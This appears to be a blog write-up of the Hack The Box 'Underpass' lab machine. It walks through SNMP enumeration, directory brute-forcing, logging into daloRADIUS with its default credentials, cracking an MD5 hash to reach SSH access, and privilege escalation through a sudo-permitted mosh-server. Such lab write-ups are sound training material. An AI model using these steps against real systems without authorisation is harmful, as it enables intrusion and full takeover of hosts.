@@ -1,0 +1,208 @@
+---
+title: Underpass
+date: '2024-12-25'
+description: 'Hacking Exploits: A Write-Up on the Underpass Machine'
+type: writeup
+platform: hackthebox
+tags:
+  - ACTIVE MACHINE
+  - Easy
+  - hack the box
+  - LINUX
+cover: /mc/uploads/2025/01/GfLT662W8AADNOY.jpg
+---
+
+# بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
+
+
+Hello, today we gonna try to hack the Underpass machine on hackthebox .  
+The first thing is enumerate and see if there is an open port on the target machine for that we gonna use the tool nmap
+
+## Enumerating with Nmap
+
+i tried to scan the machine in the first but i found just the port 80 and 22 so i tried with to scan UDP ports.
+
+```bash
+$ nmap  -sU 10.10.11.48 -T5
+  Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST
+  Warning: 10.10.11.48 giving up on port because retransmission cap hit (2).
+  Nmap scan report for underpass.htb (10.10.11.48)
+  Host is up (0.073s latency).
+  Not shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)
+  PORT    STATE SERVICE
+  161/udp open  snmp
+
+ Nmap done: 1 IP address (1 host up) scanned in 100.11 seconds
+``` 
+
+we find SNMP port open and SNMP stands for service network management protocol , that port is used monitor and manage the network devices connected over an IP we gonna use now snmp-check tool that helps us to enumerate the SNMP devices
+
+```bash
+$ snmp-check 10.10.11.48
+ snmp-check v1.9 - SNMP enumerator
+ Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)
+
+ [+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'
+
+ [*] System information:
+
+  Host IP address               : 10.10.11.48
+  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
+  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
+  Contact                       : steve@underpass.htb
+  Location                      : Nevada, U.S.A. but not Vegas
+  Uptime snmp                   : 00:49:46.89
+  Uptime system                 : 00:49:36.98
+  System date                   : 2024-12-25 19:21:21.0
+```
+interesting, we find a user:steve and the name of Host Underpass.htb daloradius , lets look for it.
+
+## Enumerating Directories
+
+```bash
+$ dirsearch -u http://Underpass.htb/daloradius/
+
+/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_Underpass.htb/_daloradius_24-12-25_14-24-00.txt
+
+Target: http://Underpass.htb/
+
+[14:24:00] Starting: daloradius/                                                                                                                  
+[14:24:05] 200 -  221B  - /daloradius/.gitignore                            
+[14:24:29] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
+[14:24:35] 200 -   24KB - /daloradius/ChangeLog                             
+[14:24:41] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
+[14:24:41] 200 -    2KB - /daloradius/docker-compose.yml                    
+[14:24:41] 200 -    2KB - /daloradius/Dockerfile
+[14:24:55] 301 -  327B  - /daloradius/library  ->  http://underpass.htb/daloradius/library/
+[14:24:55] 200 -   18KB - /daloradius/LICENSE                               
+[14:25:11] 200 -   10KB - /daloradius/README.md                             
+[14:25:15] 301 -  325B  - /daloradius/setup  ->  http://underpass.htb/daloradius/setup/
+
+Task Completed
+```
+try to look for all these files and find something , lets brute force the directories
+
+```bash
+$ dirsearch -u http://Underpass.htb/daloradius/app 
+ /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                  
+ (_||| _) (/_(_|| (_| )                                                                                                                           
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app_24-12-25_14-33-44.txt
+
+Target: http://Underpass.htb/
+
+[14:33:44] Starting: daloradius/app/                                                                                                              
+[14:34:20] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
+[14:35:11] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
+[14:35:11] 302 -    0B  - /daloradius/app/users/  ->  home-main.php         
+[14:35:11] 200 -    2KB - /daloradius/app/users/login.php
+```
+WOOW , we find a login page Great , but we need Username lets brute force  
+directories more like /doc so i brute forced till i found
+
+```bash
+$ [14:42:06] Starting: daloradius/doc/install/                                                                                                      
+  [14:42:55] 200 -    8KB - /daloradius/doc/install/INSTALL                   
+
+  Task Completed
+```
+after reading this file i we found the Username and the Password
+
+```bash
+  5. INSTALLATION COMPLETE
+   ------------------------
+              Surf to http://yourip/daloradius
+              Login:
+                  username: administrator
+                  password: radius
+```
+so i tried this administrator:radius and it failed so lets try to brute force  
+the /app directory more and hope for something
+
+```bash
+$  dirsearch -u http://Underpass.htb/daloradius/app/ -w SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt 
+  /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/   pkg_resources.html
+  from pkg_resources import DistributionNotFound, VersionConflict
+
+  _|. _ _  _  _  _ _|_    v0.4.3
+ (_||| _) (/_(_|| (_| )
+
+ Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 220544
+
+  Output File: /home/kali/reports/http_Underpass.htb/_daloradius_app__24-12-25_14-54-26.txt
+
+ Target: http://Underpass.htb/
+
+ [14:54:26] Starting: daloradius/app/
+ [14:54:27] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
+ [14:54:27] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
+ [14:55:10] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/
+```
+i went to /app/operators and i tried to access it with the last Username:Password we had and its works we went to management and list users and we find a hashed password so lets try to decode it with crackstation or u can use john the ripper. (type:MD5) **412DD4759978ACFCC81DEAB01B382403**:**underwaterfriends** and lets try to ssh with the username:password we got (btw : the username is svcMosh)
+
+## FootHold
+
+```bash
+$ ssh svcMosh@10.10.11.48
+# and enter the password : underwaterfriends
+```
+IT WORKS, now we are inside the target machine  
+so u can read the user.flag
+
+```bash
+ svcMosh@underpass:~$ cat user.txt
+ 60a620dd37a894c9b.... # U got this mate
+```
+## Priv Escalation
+
+```bash
+ svcMosh@underpass:~$ sudo -l
+  Matching Defaults entries for svcMosh on localhost:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty
+
+  User svcMosh may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/bin/mosh-server
+```
+after some searching on google or u can read its manual
+
+```bash
+svcMosh@underpass:~$mosh
+   Usage: /usr/bin/mosh [options] [--] [user@]host [command...]
+        --client=PATH        mosh client on local machine
+                                (default: "mosh-client")
+        --server=COMMAND     mosh server on remote machine # interesting 
+                                (default: "mosh-server")
+```
+And we are the root , we can read the root file and get this done
+
+```bash
+ svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost
+
+ root@underpass:~# cat /root/root.txt #we are the root 
+  882f2654c3c9... #try to find it
+```
+```text
+                          CONGRATULATION 
+```
+
+## Summary :
+
+for me , its my first time scanning UDP ports , and enumerate SNMP so it was  
+a good experience. we learn that we need to brute force some directories  
+more and more until we find something that lead us to the target .  
+Also for the Privesca , it was good to learn about "mosh" command  
+and what used for and a Misconfiguration can lead to a root privileges.
